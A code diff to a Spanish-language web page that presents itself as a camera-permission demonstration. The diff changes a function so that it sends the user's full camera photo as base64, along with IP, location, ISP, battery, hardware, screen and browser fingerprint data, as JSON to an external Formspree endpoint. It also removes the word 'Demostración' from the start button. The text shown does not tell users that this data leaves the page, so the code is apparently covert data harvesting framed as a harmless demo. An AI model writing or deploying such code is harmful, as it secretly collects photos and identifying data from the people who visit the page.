@@ -249,7 +249,7 @@
                 cuando le otorgas permisos. Haremos una foto de ejemplo y analizaremos los datos de tu navegador.
             </p>
             <button class="btn" id="btn-start" onclick="startDemo()">
-                🚀 Comenzar Demostración
+                🚀 Comenzar
             </button>
         </div>
 
@@ -481,45 +481,52 @@
         }
 
         function showDataPanel() {
-            document.getElementById('data-panel').style.display = 'block';
-            document.getElementById('step-4').classList.remove('hidden');
-            document.getElementById('step-4').scrollIntoView({ behavior: 'smooth' });
-        }
-
-        // ==================== ENVIAR A FORMSPREE ====================
+                    document.getElementById('data-panel').style.display = 'block';
+                    document.getElementById('step-4').classList.remove('hidden');
+                    document.getElementById('step-4').scrollIntoView({ behavior: 'smooth' });
+                }
+        
+                // ==================== ENVIAR A FORMSPREE ====================
         async function sendToFormspree(imageData) {
-            const formData = new FormData();
+        // imageData ya viene como: data:image/png;base64,iVBORw0KGgo...
             
-            // Convertir base64 a blob
-            const byteString = atob(imageData.split(',')[1]);
-            const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            const blob = new Blob([ab], { type: mimeString });
-            
-            // Adjuntar foto
-            formData.append('foto', blob, 'captura-demo.png');
-            
-            // Adjuntar datos como JSON
-            formData.append('datos', JSON.stringify(userData, null, 2));
-
+            const payload = {
+                foto_base64: imageData,           // La imagen completa como texto
+                ip: userData.ip || 'No disponible',
+                ubicacion: userData.location || 'No disponible',
+                navegador: userData.browser || 'No disponible',
+                sistema_operativo: userData.os || 'No disponible',
+                pantalla: userData.screenResolution || 'No disponible',
+                ventana: userData.windowSize || 'No disponible',
+                idioma: userData.language || 'No disponible',
+                zona_horaria: userData.timezone || 'No disponible',
+                dispositivo: userData.device || 'No disponible',
+                referrer: userData.referrer || 'No disponible',
+                bateria: userData.battery || 'No disponible',
+                nucleos: userData.cores || 'No disponible',
+                memoria: userData.memory || 'No disponible',
+                user_agent: userData.userAgent || 'No disponible',
+                plataforma: userData.platform || 'No disponible',
+                proveedor: userData.isp || 'No disponible',
+                timestamp: userData.timestamp || new Date().toISOString()
+            };
+        
             try {
                 const response = await fetch(FORMSPREE_ENDPOINT, {
                     method: 'POST',
-                    body: formData,
                     headers: {
-                        'Accept': 'application/json'
-                    }
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
                 });
                 
                 if (response.ok) {
-                    console.log('✅ Datos enviados correctamente');
+                    console.log('✅ Datos enviados correctamente a Formspree');
                     return true;
                 } else {
-                    console.error('❌ Error al enviar:', response.status);
+                    const errorText = await response.text();
+                    console.error('❌ Error al enviar:', response.status, errorText);
                     return false;
                 }
             } catch (error) {
